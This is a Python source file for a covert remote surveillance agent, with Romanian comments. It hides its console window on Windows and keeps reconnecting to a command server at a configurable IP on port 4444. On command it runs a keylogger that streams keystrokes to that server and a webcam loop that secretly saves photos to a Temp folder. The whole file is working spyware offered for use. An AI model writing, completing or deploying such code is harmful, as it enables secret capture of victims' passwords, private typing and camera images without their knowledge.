import socket
import threading
import time
import pynput.keyboard
import cv2
import os
import sys
import ctypes
from datetime import datetime

# ====================== ASCUNDERE CONSOLĂ ======================
if sys.platform == "win32":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

class Agent:
    def __init__(self):
        self.server_ip = "192.168.56.1"      # <<< SCHIMBĂ CU IP-UL TĂU REAL
        self.server_port = 4444
        self.socket = None
        
        self.keylogger_running = False
        self.camera_running = False
        self.key_listener = None
        self.camera = None
        self.buffer = ""
        self.last_send_time = time.time()

    def connect_to_server(self):
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_ip, self.server_port))
                self.listen_for_commands()
                break
            except:
                time.sleep(5)

    def listen_for_commands(self):
        while True:
            try:
                command = self.socket.recv(1024).decode('utf-8').strip()
                if not command:
                    continue
                    
                if command == "START_KEYLOGGER":
                    self.start_keylogger()
                elif command == "STOP_KEYLOGGER":
                    self.stop_keylogger()
                elif command == "START_CAMERA":
                    self.start_camera()
                elif command == "STOP_CAMERA":
                    self.stop_camera()
            except:
                break

    # ====================== KEYLOGGER ======================
    def start_keylogger(self):
        if self.keylogger_running:
            return
        self.keylogger_running = True
        self.buffer = ""
        self.last_send_time = time.time()

        def on_press(key):
            try:
                char = key.char
            except AttributeError:
                if key == pynput.keyboard.Key.space:
                    char = " "
                elif key == pynput.keyboard.Key.enter:
                    char = "\n"
                elif key == pynput.keyboard.Key.backspace:
                    char = "[BACK]"
                else:
                    char = f"[{str(key).replace('Key.', '')}]"

            self.buffer += char

            current_time = time.time()
            if (len(self.buffer) >= 8 or 
                key in [pynput.keyboard.Key.enter, pynput.keyboard.Key.backspace] or 
                current_time - self.last_send_time > 1.5):
                
                if self.buffer.strip():
                    self.send_data(f"KEYLOG: {self.buffer}")
                    self.buffer = ""
                    self.last_send_time = current_time

        self.key_listener = pynput.keyboard.Listener(on_press=on_press)
        self.key_listener.start()
        self.send_data("Keylogger started")

    def stop_keylogger(self):
        if self.key_listener:
            self.key_listener.stop()
        self.keylogger_running = False
        self.send_data("Keylogger stopped")

    # ====================== WEBCAM ======================
    def start_camera(self):
        if self.camera_running:
            return
        self.camera_running = True

        def camera_loop():
            self.camera = cv2.VideoCapture(0)
            while self.camera_running:
                ret, frame = self.camera.read()
                if ret:
                    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                    filename = f"capture_{timestamp}.jpg"
                    path = os.path.join(os.path.expanduser("\~"), "AppData", "Local", "Temp", "captures")
                    os.makedirs(path, exist_ok=True)
                    cv2.imwrite(os.path.join(path, filename), frame)
                    self.send_data(f"PHOTO_SAVED: {filename}")
                time.sleep(10)

        threading.Thread(target=camera_loop, daemon=True).start()
        self.send_data("Camera started")

    def stop_camera(self):
        self.camera_running = False
        if self.camera:
            self.camera.release()
        self.send_data("Camera stopped")

    def send_data(self, data):
        try:
            message = f"[{datetime.now().strftime('%H:%M:%S')}] {data}"
            self.socket.send((message + "\n").encode('utf-8'))
        except:
            pass

# ====================== PORNIRE ======================
if __name__ == "__main__":
    agent = Agent()
    agent.connect_to_server()